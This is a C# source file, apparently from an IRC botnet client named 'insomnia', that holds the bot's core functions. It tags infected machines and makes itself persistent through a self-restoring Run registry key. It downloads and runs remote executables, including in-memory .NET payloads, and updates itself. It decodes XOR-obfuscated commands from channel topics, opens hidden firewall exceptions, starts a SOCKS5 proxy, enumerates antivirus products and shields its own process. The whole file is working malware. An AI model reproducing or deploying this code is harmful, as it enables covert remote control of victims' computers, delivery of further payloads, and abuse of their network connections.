using System;
using System.Collections.Generic;
using System.Text;
using Microsoft.Win32;
using System.Security.Principal;
using System.IO;
using System.Net;
using System.Globalization;
using System.Reflection;
using System.Security.Cryptography;
using System.Diagnostics;
using System.Threading;
using System.Management;
using System.Runtime.InteropServices;

namespace insomnia
{
    internal class Functions
    {
        private static readonly Random rand = new Random();
        private const string chars = "abcdefghijklmnopqrstuvwxyz";
        public static bool monitorActive = true;
        public static bool socksOn = false;
        public static bool socksHasStarted = false;
        public static string externalIP = String.Empty;

        public static string BotNick()
        {
            return IsNewInfection() + "{" + GeoIPCountry() +  "|" + OSName() + "-" + ArchType() + PermType() + "}" + Config.randomID;
        }
        public static string IsNewInfection()
        {
            try
            {
                DateTime dt = File.GetCreationTime(Config.currentPath);
                if (DateTime.Now.Subtract(dt).TotalHours > 1)
                    return "";
                else
                    return "n";
            }
            catch
            {
                return "";
            }
        }
        public static string OSName()
        {
            string osName = "";
            OperatingSystem oSVersion = Environment.OSVersion;
            if (oSVersion.Platform == PlatformID.Win32NT)
            {
                if (oSVersion.Version.Major == 5)
                {
                    switch (oSVersion.Version.Minor)
                    {
                        case 0:
                            osName = "2K";
                            break;

                        case 1:
                            osName = "XP";
                            break;

                        case 2:
                            osName = "2k3";
                            break;
                    }
                }
                if (oSVersion.Version.Major == 6)
                {
                    switch (oSVersion.Version.Minor)
                    {
                        case 0:
                            osName = "VI";
                            break;

                        case 1:
                            osName = "W7";
                            break;

                        case 2:
                            osName = "W8";
                            break;
                    }
                }
            }
            if (osName == "")
                osName = "XP";
            
            return osName;
        }
        public static string ArchType()
        {
            // Originally I wanted to use the IsWow64Process function but it looks like it isn't supported on all OS older than XP SP2 (Not really an issue but this is working fine right now).
            // http://social.msdn.microsoft.com/forums/en-US/csharpgeneral/thread/24792cdc-2d8e-454b-9c68-31a19892ca53/

            if (Registry.LocalMachine.OpenSubKey(@"Hardware\Description\System\CentralProcessor\0").GetValue("Identifier").ToString().Contains("x86"))
                return "32";
            else
                return "64";
        }
        public static string PermType()
        {
            bool isAdmin = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) ? true : false;
            if (isAdmin)
                return "a";
            else
                return "u";
        }
        public static string GeoIPCountry()
        {
            try
            {
                using (WebClient wc = new WebClient())
                {
                    string data = wc.DownloadString("http://api.wipmania.com");
                    string[] toParse = data.Split(new string[] { "<br>" }, StringSplitOptions.None);
                    externalIP = toParse[0];
                    if (toParse[1].Length == 2 && toParse[1] != "XX") // Check for valid CC. Also if it's XX, if we get that then ignore it: WIPMANIA's code for UNKNOWN.
                        return toParse[1];
                    else
                        return SystemLocale();
                }
            }
            catch
            {
                return SystemLocale();
            }
        }
        public static string SystemLocale()
        {
            return RegionInfo.CurrentRegion.TwoLetterISORegionName;
        }
        public static string RandomString(int size)
        {
            char[] buffer = new char[size];

            for (int i = 0; i < size; i++)
                buffer[i] = chars[rand.Next(chars.Length)];

            return new string (buffer);
        }
        public static string PEType(string filePath)
        {
            try
            {
                Assembly a = Assembly.Load(File.ReadAllBytes(filePath)); // Assembly.LoadFile will LOCK the path! To avoid use Load(File.ReadAllBytes(
                return ".NET " + a.ImageRuntimeVersion + " -> " + a.FullName.Split(',')[0];
            }
            catch
            {
                return "Native";
            }
        }
        public static string GetMD5Hash(string filePath)
        {
            string strHashData = "";
            byte[] arrbytHashValue;
            FileStream oFileStream = null;
            MD5CryptoServiceProvider oMD5Hasher = new MD5CryptoServiceProvider();

            try
            {
                oFileStream = GetFileStream(filePath);
                arrbytHashValue = oMD5Hasher.ComputeHash(oFileStream);
                oFileStream.Close();
                strHashData = BitConverter.ToString(arrbytHashValue).Replace("-", "");
                oFileStream.Dispose();
                return (strHashData.ToUpper());  
            }
            catch
            {
                return "error";
            }
        }
        private static FileStream GetFileStream(string filePath)
        {
            return (new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite));
        }
        public static void Uninstall(string quitMsg)  // NEED TO DELETE REG KEY
        {
            try
            {
                IRC.Disconnect(quitMsg);

                File.SetAttributes(Config.currentPath, FileAttributes.Normal);
                
                // Disarm registry monitor and delete the key
                monitorActive = false;
                RegistryPath().DeleteValue(Config._registryKey());
                
                // Spawn a new cmd process to wait 3 seconds and remove the file
                ProcessStartInfo rem = new ProcessStartInfo();
                rem.Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + Config.currentPath;
                rem.WindowStyle = ProcessWindowStyle.Hidden;
                rem.CreateNoWindow = true;
                rem.FileName = "cmd.exe";
                Process.Start(rem);

                Environment.Exit(0);
            }
            catch
            {
                Environment.Exit(0);
            }
        }
        public static RegistryKey RegistryPath()
        {
            if (Functions.PermType() == "u")
                return Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            else // It's admin, lets try to drop in HKLM
            {
                try
                {
                    Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true).SetValue(Config._registryKey(), Config.currentPath);
                    Config.regLocation = "HKLM";
                    return Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                }
                catch
                {
                    return Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                }
            }
        }
        public static void RegistryMonitor()
        {
            while (monitorActive)
            {
                try
                {
                    if (RegistryPath().GetValue(Config._registryKey()).ToString() != Config.currentPath)
                        RegistryPath().SetValue(Config._registryKey(), Config.currentPath);
                }
                catch 
                {
                    RegistryPath().SetValue(Config._registryKey(), Config.currentPath);
                }
                Thread.Sleep(1000);
            }
        }
        public static string DownloadExeFile(string url, string env, string param3, bool hidden)
        {
            string defaultEnv = "APPDATA";
            bool memExec = false;
            bool timeExec = false;

            if (!url.Contains("http://") && !url.Contains("https://"))
                url = "http://" + url;

            if (!String.IsNullOrEmpty(env))
                if (env.Contains("-"))
                {
                    if (env.Contains("m"))
                        memExec = true;
                    else if (env.Contains("t") && !String.IsNullOrEmpty(param3))
                        timeExec = true;
                }
                else
                {
                    defaultEnv = env;
                }
            try
            {
                string output = Environment.GetEnvironmentVariable(defaultEnv) + "\\" + Functions.RandomString(6) + ".exe";

                if (memExec)
                {
                    using (WebClient wc = new WebClient())
                    {
                        byte[] payload = wc.DownloadData(url); //get our bytez brah
                        Assembly a = Assembly.Load(payload);
                        IRC.WriteMessage("Executed .NET byte array in memory:" + IRC.ColorCode(" " + a.FullName) + ", Runtime:" + IRC.ColorCode(" " + a.ImageRuntimeVersion) + ", Length:" + IRC.ColorCode(" " + payload.Length) + ".", IRC.channel);
                        new Thread(() => a.EntryPoint.Invoke(null, null)).Start();
                    }
                }
                else
                {
                    using (WebClient wc = new WebClient())
                    {
                        wc.DownloadFile(url, output);
                    }

                    if (File.Exists(output))
                    {
                        if (timeExec)
                        {
                            int delay = Convert.ToInt32(param3);

                            using (Process p = new Process())
                            {
                                FileInfo fi = new FileInfo(output);
                                p.StartInfo.FileName = output;

                                if (hidden)
                                {
                                    p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                                    p.StartInfo.CreateNoWindow = true;
                                }
                                p.Start();
                                IRC.WriteMessage("Executing: '" + IRC.ColorCode(output) + "' for" + IRC.ColorCode(" " + delay) + " seconds, Type: " + IRC.ColorCode(Functions.PEType(output)) + ", Size:" + IRC.ColorCode(" " + fi.Length + " bytes") + ".", IRC.channel);

                                Thread.Sleep(delay * 1000);
                                IRC.WriteMessage("Timed execution finished on: '" + IRC.ColorCode(output) + "'. Process will be termianted and file removed.", Config._mainChannel());
                                p.Kill();
                                File.Delete(output);
                            }
                        }
                        else
                        {
                            using (Process p = new Process())
                            {
                                FileInfo fi = new FileInfo(output);
                                p.StartInfo.FileName = output;

                                if (hidden)
                                {
                                    p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                                    p.StartInfo.CreateNoWindow = true;
                                }
                                p.Start();

                                IRC.WriteMessage("Executed: '" + IRC.ColorCode(output) + "', Type: " + IRC.ColorCode(Functions.PEType(output)) + ", Size:" + IRC.ColorCode(" " + fi.Length + " bytes") + ".", IRC.channel);
                            }
                        }
                    }
                }
                return output;
            }
            catch (Exception ex)
            {
                string error = "Could not download the file:";

                if (ex.Message.Contains("404"))
                    error += IRC.ColorCode(" 404 file not found");
                else if (ex.Message.Contains("460"))
                    error += IRC.ColorCode(" 460 access restricted");
                else
                    error = null;
                if (error != null)
                    IRC.WriteMessage(error + ".", IRC.channel);

                return "error";
            }
        }
        public static void UpdateBot(string param1, string param2)
        {
            try
            {
                string path = Environment.GetEnvironmentVariable("APPDATA") + "\\" + Functions.RandomString(5) + ".exe";

                using (WebClient wc = new WebClient())
                {
                    wc.DownloadFile(param1, path);

                    string newMD5 = Functions.GetMD5Hash(path);
                    if (param2 == newMD5)
                    {
                        if (Config.botMD5 == newMD5)
                        {
                            IRC.WriteMessage("Bot file is already up to date:" + IRC.ColorCode(" " + Config.botMD5 + " == " + newMD5) + ".", Config._mainChannel());
                        }
                        else
                        {
                            using (Process p = new Process())
                            {
                                p.StartInfo.FileName = path;
                                p.Start();
                            }

                            IRC.WriteMessage("File was successfully updated:" + IRC.ColorCode(" " + Config.botMD5 + " -> " + newMD5) + ".", Config._mainChannel());
                            Functions.Uninstall("Updating...");
                        }
                    }
                    else
                    {
                        IRC.WriteMessage("MD5 Mismatch:" + IRC.ColorCode(" " + param2) + " !=" + IRC.ColorCode(" " + newMD5) + ".", Config._mainChannel());
                    }
                }
            }
            catch
            {
            }
        }
        public static List<string> GetTcpConnections()
        {
            List<string> conTable = new List<string>();

            int AF_INET = 2; // IPV4
            int buffSize = 20000;
            byte[] buffer = new byte[buffSize];

            int res = Win32.GetExtendedTcpTable(buffer, out buffSize, true, AF_INET, Win32.TCP_TABLE_CLASS.TCP_TABLE_OWNER_PID_ALL, 0);

            int offset = 0;
            int numEntries = Convert.ToInt32(buffer[offset]);
            offset += 4;

            for (int i = 0; i < numEntries; i++)
            {
                int state = Convert.ToInt32(buffer[offset]);
                offset += 4;

                string local = BufferToIPEndPoint(buffer, ref offset, false).Address.ToString();
                IPEndPoint remote = BufferToIPEndPoint(buffer, ref offset, true);
                int pid = BufferToInt(buffer, ref offset);

                try
                {
                    string data = remote.Address.ToString() + ":" + remote.Port.ToString();
                    if (!data.Split(':')[0].Contains("0.0.0.0") && !data.Split(':')[0].Contains("127.0.0.1"))
                        conTable.Add(data + ":" + pid.ToString());
                }
                catch
                {
                }
            }
            return conTable;
        }
        private static int BufferToInt(byte[] buffer, ref int nOffset)
        {
            int res = (((int)buffer[nOffset])) + (((int)buffer[nOffset + 1]) << 8) +
                (((int)buffer[nOffset + 2]) << 16) + (((int)buffer[nOffset + 3]) << 24);
            nOffset += 4;
            return res;
        }
        private static IPEndPoint BufferToIPEndPoint(byte[] buffer, ref int nOffset, bool IsRemote)
        {
            Int64 m_Address = ((((buffer[nOffset + 3] << 0x18) | (buffer[nOffset + 2] << 0x10)) | (buffer[nOffset + 1] << 8)) | buffer[nOffset]) & ((long)0xffffffff);
            nOffset += 4;
            int m_Port = 0;
            m_Port = (IsRemote && (m_Address == 0))? 0 : 
                        (((int)buffer[nOffset]) << 8) + (((int)buffer[nOffset + 1])) + (((int)buffer[nOffset + 2]) << 24) + (((int)buffer[nOffset + 3]) << 16);
            nOffset += 4;
            IPEndPoint temp = new IPEndPoint(m_Address, m_Port);
            return temp;
        }
        public static void SuspendProcess(int PID)
        {
            using (Process proc = Process.GetProcessById(PID))
            {

                if (proc.ProcessName == string.Empty)
                    return;

                foreach (ProcessThread pT in proc.Threads)
                {
                    IntPtr pOpenThread = Win32.OpenThread(Win32.ThreadAccess.SUSPEND_RESUME, false, (uint)pT.Id);

                    if (pOpenThread == IntPtr.Zero)
                    {
                        break;
                    }

                    Win32.SuspendThread(pOpenThread);
                }
            }
        }
        public static void ResumeProcess(int PID)
        {
            using (Process proc = Process.GetProcessById(PID))
            {
                if (proc.ProcessName == string.Empty)
                    return;
           

                foreach (ProcessThread pT in proc.Threads)
                {
                    IntPtr pOpenThread = Win32.OpenThread(Win32.ThreadAccess.SUSPEND_RESUME, false, (uint)pT.Id);
    
                    if (pOpenThread == IntPtr.Zero)
                    {
                        break;
                    }
    
                    Win32.ResumeThread(pOpenThread);
                }
            }
        }
        public static void DecryptTopic(string topic)
        {
            try
            {
                string param1 = "";
                string param2 = "";
                string param3 = "";
                string param4 = "";

                string first = Encoding.UTF8.GetString(Convert.FromBase64String(topic));
                string[] parts = first.Split('|');
                string makeDataEncrypted = Encoding.UTF8.GetString(Convert.FromBase64String(parts[0]));
                string customerID = parts[1];
                if (customerID == Config.customerID)
                {
                    int key = Convert.ToInt32(customerID.Substring(5, 3));
                    string commands = Chk(makeDataEncrypted, key).Replace(" .", ".");
                    string[] commandArray = commands.Split('|');
                    foreach (string c in commandArray)
                    {
                        string[] message = c.Split(' ');
                        try
                        {
                            param1 = message[1];
                            param2 = message[2];
                            param3 = message[3];
                            param4 = message[4];
                        }
                        catch
                        {
                        }
                        IRC.runCommand(message[0], IRC.channel, param1, param2, param3, param4, message);
                    }
                }
            }
            catch
            {
            }
        }
        public static string Chk(string textToEncrypt, int key)
        {
            StringBuilder inSb = new StringBuilder(textToEncrypt);
            StringBuilder outSb = new StringBuilder(textToEncrypt.Length);
            char c;
            for (int i = 0; i < textToEncrypt.Length; i++)
            {
                c = inSb[i];
                c = (char)(c ^ key);
                outSb.Append(c);
            }
            return outSb.ToString();
        }
        public static void AddFirewallException()
        {
            using (Process p = new Process())
            {
                p.StartInfo.FileName = Environment.SpecialFolder.System + "\\cmd.exe";
                p.StartInfo.Arguments = "netsh advfirewall firewall add rule name=\"" + Config.currentPath +  "\" dir=in action=allow program=\"" + Config.currentPath + "\" enable=yes";
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                p.StartInfo.CreateNoWindow = true;
                p.Start();
            }
        }

        public static string GetAntiVirus()
        {
            string str = "none";
            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "SELECT * FROM AntivirusProduct"))
            {
                ManagementObjectCollection instances = searcher.Get();
                foreach (ManagementObject queryObj in instances)
                {
                    str = queryObj["displayName"].ToString();
                }
            }
            return str;
        }
        public static string GetFirewall()
        {
            string str = "none";
            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "SELECT * FROM FirewallProduct"))
            {
                ManagementObjectCollection instances = searcher.Get();
                foreach (ManagementObject queryObj in instances)
                {
                    str = queryObj["displayName"].ToString();
                }
            }
            return str;
        }

        public static void Socks(string param1, string param2)
        {
            if (!String.IsNullOrEmpty(param1) && !String.IsNullOrEmpty(param2))
            {
                Config.socksUser = param1;
                Config.socksPass = param2;
            }
            else
            {
                Config.socksUser = Config.randomID;
                Config.socksPass = Functions.RandomString(5);
            }
            
            try
            {
                if (!socksOn && externalIP != String.Empty)
                {
                    IRC.WriteMessage("Attempting to start SOCKS5 server on:" + IRC.ColorCode(" " + Functions.externalIP) + "...", IRC.channel);
                    try
                    {
                        AddFirewallException();
                    }
                    catch
                    {
                    }
                    Thread s = new Thread(s5init.StartSocks);
                    s.IsBackground = true;
                    s.Start();
                    socksOn = true;
                    socksHasStarted = true;
                }
                else if (s5init.socksGood && socksHasStarted)
                {
                    IRC.WriteMessage(s5init.socksDetails(), IRC.channel);
                    s5init.socksEnabled = true;
                    socksOn = true;
                }
            }
            catch
            {
            }
        }

        public static bool ProtectProc(IntPtr hProcess)
        {
            const int DACL_SECURITY_INFORMATION = 0x00000004;
            const int SDDL_REVISION_1 = 0x00000001;

            Win32.SECURITY_ATTRIBUTES sa = new Win32.SECURITY_ATTRIBUTES();
            sa.nLength = Marshal.SizeOf(sa);
            sa.bInheritHandle = 0;
            int secSize = 0; //TODO: Check size before calling SKOS?

            Win32.ConvertStringSecurityDescriptorToSecurityDescriptor("D:P", SDDL_REVISION_1, out sa.lpSecurityDescriptor, out secSize);

            if (Win32.SetKernelObjectSecurity(hProcess, DACL_SECURITY_INFORMATION, sa.lpSecurityDescriptor))
                return true;
            else
                return false;
        }
    }
}
